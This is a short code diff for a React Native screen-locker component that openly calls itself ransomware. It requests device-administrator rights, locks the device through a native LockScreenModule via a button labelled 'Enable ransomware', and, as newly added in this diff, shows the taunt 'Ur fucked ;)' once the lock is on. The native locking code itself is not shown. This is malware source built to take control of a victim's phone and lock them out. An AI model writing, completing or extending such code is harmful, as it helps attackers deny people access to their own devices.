@@ -1,5 +1,5 @@
 import React from 'react';
-import {Alert, Text, TouchableOpacity, View, NativeModules} from 'react-native';
+import { NativeModules, Text, TouchableOpacity, View } from 'react-native';
 const {LockScreenModule} = NativeModules;
 
 function CustomButton({title, onPress}: any): JSX.Element {
@@ -20,7 +20,7 @@ function CustomButton({title, onPress}: any): JSX.Element {
 
 function onPress() {
   //Alert.alert('You tapped the button! Locking screen...');
-  LockScreenModule.lockScreen();
+  LockScreenModule.setLock(true);
 }
 
 function enableAdmin() {
@@ -29,15 +29,20 @@ function enableAdmin() {
 }
 
 function Locker(): JSX.Element {
+  const [isLocked, setIsLocked] = React.useState(false);
   LockScreenModule.isAdminActive((result: boolean) => {
     if (!result) {
       enableAdmin();
     }
   });
 
+  LockScreenModule.isLockEnabled((result: boolean) => {
+    setIsLocked(result);
+  });
+
   return (
     <View style={{flex: 1, justifyContent: 'center', alignItems: 'center'}}>
-      <CustomButton title="Enable ransomware" onPress={onPress} />
+      {!isLocked? <CustomButton title="Enable ransomware" onPress={onPress} /> : <Text>Ur fucked ;)</Text>}
     </View>
   );
 }
